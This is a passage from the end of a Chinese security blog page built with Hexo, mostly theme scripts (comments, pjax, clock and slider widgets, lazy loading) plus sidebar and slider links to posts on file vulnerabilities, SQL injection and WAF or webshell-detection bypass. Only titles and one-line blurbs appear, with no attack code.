data-original="/img/cover/file_delete.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件删除漏洞"/></a><div class="content"><a class="title" href="/post/5617fd8e.html" title="文件删除漏洞">文件删除漏洞</a><time datetime="2022-01-25T12:00:00.000Z" title="发表于 2022-01-25 20:00:00">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/9b550335.html" title="文件读取下载漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/file_read.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件读取下载漏洞"/></a><div class="content"><a class="title" href="/post/9b550335.html" title="文件读取下载漏洞">文件读取下载漏洞</a><time datetime="2022-01-25T09:00:00.000Z" title="发表于 2022-01-25 17:00:00">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f91abec7.html" title="编辑器文件上传漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="编辑器文件上传漏洞"/></a><div class="content"><a class="title" href="/post/f91abec7.html" title="编辑器文件上传漏洞">编辑器文件上传漏洞</a><time datetime="2022-01-23T14:00:00.000Z" title="发表于 2022-01-23 22:00:00">2022-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞之WAF拦截绕过"/></a><div class="content"><a class="title" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过">文件上传漏洞之WAF拦截绕过</a><time datetime="2022-01-22T06:00:00.000Z" title="发表于 2022-01-22 14:00:00">2022-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
+      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8,048233cc2ce6903ca93ba6e0597462ae'.split(','),
+      friends: ''.split(','),
+      tagMeta: '博主,小伙伴,访客'.split(','),
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7c4159f7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/wafbypass.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-11-01</span><a class="blog-slider__title" href="post/7c4159f7.html" alt="">WAF-Bypass之SQL注入绕过思路总结</a><div class="blog-slider__text">本文主要介绍:从四个角度分析绕过WAF</div><a class="blog-slider__button" href="post/7c4159f7.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e6a9f884.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-12-23</span><a class="blog-slider__title" href="post/e6a9f884.html" alt="">WebShell检测绕过之下·有的放矢</a><div class="blog-slider__text">本文主要介绍:本文针对国内主流查杀引擎进行分析，通过绕过Source点、Sink点与绕过数据流处理检测对Webshell进行科学免杀</div><a class="blog-slider__button" href="post/e6a9f884.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/d5e40e85.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/upload2.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-22</span><a class="blog-slider__title" href="post/d5e40e85.html" alt="">文件上传漏洞之WAF拦截绕过</a><div class="blog-slider__text">本文主要介绍:常见的文件上传绕过WAF的手法，最后再使用目前最新版的安全狗进行绕过演示。</div><a class="blog-slider__button" href="post/d5e40e85.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>
